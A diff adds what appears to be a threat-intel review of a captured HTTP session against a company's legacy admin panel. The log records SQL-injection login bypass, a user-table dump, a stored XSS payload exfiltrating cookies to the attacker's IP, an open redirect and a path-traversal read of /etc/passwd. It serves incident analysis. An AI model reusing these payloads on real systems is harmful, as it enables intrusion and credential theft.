@@ -1,0 +1,67 @@
+================================================================
+SANKOFA DIGITAL — captured HTTP session
+Source: edge proxy access log, decoded for review.
+Window: 2024-06-04 02:14:00 — 02:31:00 UTC
+Captured by: Tunde Afolabi (Threat Intel)
+================================================================
+
+[02:14:08]  GET https://sankofa.internal/legacy-admin/
+            User-Agent: Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/115.0
+            Source IP: 185.220.101.9
+            Response: 200 OK · 1.2 KB
+
+[02:14:23]  GET https://sankofa.internal/legacy-admin/login.php
+            User-Agent: Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/115.0
+            Source IP: 185.220.101.9
+            Response: 200 OK · 0.7 KB
+
+[02:14:55]  POST https://sankofa.internal/legacy-admin/login.php
+            Body: username=admin&password=password
+            Source IP: 185.220.101.9
+            Response: 200 OK · 0.8 KB
+            Notes: page contained "Invalid credentials for user: admin"
+
+[02:15:31]  POST https://sankofa.internal/legacy-admin/login.php
+            Body: username=admin' OR '1'='1&password=anything
+            Source IP: 185.220.101.9
+            Response: 302 Found → /legacy-admin/dashboard.php
+            Notes: session cookie issued (PHPSESSID=2a8f...)
+
+[02:15:33]  GET https://sankofa.internal/legacy-admin/dashboard.php
+            Cookie: PHPSESSID=2a8f...
+            Source IP: 185.220.101.9
+            Response: 200 OK · 4.1 KB
+
+[02:16:04]  GET https://sankofa.internal/legacy-admin/users.php
+            Cookie: PHPSESSID=2a8f...
+            Source IP: 185.220.101.9
+            Response: 200 OK · 18.4 KB
+            Notes: response body includes table of 312 user rows
+            with username + email + role columns
+
+[02:18:47]  POST https://sankofa.internal/legacy-admin/comments/post
+            Cookie: PHPSESSID=2a8f...
+            Body: text=<script>fetch('https://185.220.101.9:8443/c?'+document.cookie)</script>
+            Source IP: 185.220.101.9
+            Response: 200 OK · 0.4 KB
+
+[02:21:13]  GET https://sankofa.internal/legacy-admin/login.php?next=https://185.220.101.9:8443/redir
+            Source IP: 185.220.101.9
+            Response: 302 Found → https://185.220.101.9:8443/redir
+            Notes: external redirect honoured by the app
+
+[02:24:02]  GET https://sankofa.internal/legacy-admin/files/?path=/etc/passwd
+            Cookie: PHPSESSID=2a8f...
+            Source IP: 185.220.101.9
+            Response: 200 OK · 2.1 KB
+            Notes: response body begins "root:x:0:0:root:/root:/bin/bash"
+
+[02:30:51]  GET https://sankofa.internal/legacy-admin/dashboard.php
+            Cookie: PHPSESSID=2a8f...
+            Source IP: 185.220.101.9
+            Response: 200 OK
+            Notes: final view before connection dropped
+
+================================================================
+END OF CAPTURE
+================================================================
